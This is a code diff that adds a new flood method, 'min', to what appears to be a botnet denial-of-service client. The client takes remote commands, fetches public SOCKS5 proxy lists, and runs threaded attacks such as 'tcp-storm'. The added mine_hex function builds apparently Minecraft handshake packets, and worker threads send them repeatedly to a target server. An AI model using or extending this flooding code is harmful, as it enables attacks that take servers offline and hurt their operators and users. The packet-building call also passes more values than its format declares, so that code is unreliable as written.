@@ -218,6 +218,24 @@ def get_cookies(driver):
         pieces.append(cookie_string)
     return ";".join(pieces)
 
+def mine_hex(target , port):
+    protocol_version = 763
+    server_address = target.encode('utf-8')
+    server_address_length = len(server_address)
+    server_port = port
+    next_state = 1 
+    packet_id = 0x00
+    packet = pack(
+        f">B B {server_address_length}s H B",
+        packet_id, 
+        protocol_version,
+        server_address_length, 
+        server_address, 
+        server_port, 
+        next_state
+    )
+    return packet
+
 def socks5geter():
     prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"
     prapi2 = "https://raw.githubusercontent.com/zloi-user/hideip.me/refs/heads/main/https.txt"
@@ -293,7 +311,6 @@ def main():
                     except:
                         pass
                 sleep(5)
-
         try:
             while True:
                 data = s.recv(1024)
@@ -319,7 +336,6 @@ def main():
                             thr(target=socks5geter).start()
                     except:
                         pass
-
                 try:
                     us = UserAgent()
                     ua = us.random
@@ -1028,6 +1044,17 @@ def main():
                                     s.send(payl)
                             except:
                                 pass
+                    
+                    def mine():
+                        while True:
+                            try:
+                                s = socket(AF_INET , SOCK_STREAM)
+                                s.connect((ip_tt , port))
+                                for _ in range(rpc):
+                                    payl = mine_hex(target , port)
+                                    s.send(payl)
+                            except:
+                                pass
 
                 try:
                     if method == 'raw':
@@ -1147,6 +1174,9 @@ def main():
                     elif method == 'tcp-storm':
                         for _ in range(threads):
                             thr(target=tcp_storm).start()
+                    elif method == 'min':
+                        for _ in range(threads):
+                            thr(target=mine).start()
                 except:
                     pass
         except:
@@ -1157,6 +1187,5 @@ def main():
                     s.close()
                 except:
                     pass
-            print("Retrying connection in 5 seconds...")
             sleep(5)
 main()
